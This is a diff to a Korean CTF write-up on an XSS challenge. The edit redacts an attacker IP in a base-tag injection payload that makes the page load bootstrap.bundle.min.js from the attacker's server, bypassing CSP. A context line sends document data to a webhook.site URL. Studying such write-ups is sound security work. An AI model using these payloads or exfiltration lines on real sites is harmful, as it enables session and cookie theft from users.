@@ -1246,7 +1246,7 @@ CSP 정책을 확인해보자.
 XSS가 발생하는 부분은 Write Letter이다.
 
 ```python
-</textarea><base href='http://35.185.85.188:8000/'><textarea>
+</textarea><base href='http://[C2]:[PORT]/'><textarea>
 ```
 
 payload는 위와 같다.
@@ -1278,7 +1278,7 @@ location.href='https://webhook.site/3b992ffc-aea9-405e-bde3-fe0c0985717f?'+docum
 view.html에서 `bootstrap.bundle.min.js`을 로드할 때, 공격자의 서버로부터 RFI를 할 것이다.
 
 ```python
-</textarea><base href='http://[C2]:8000/'><textarea>
+</textarea><base href='http://[C2]:[PORT]/'><textarea>
 ```
 
 마지막으로 write letter 기능을 통해 payload를 전송하자.
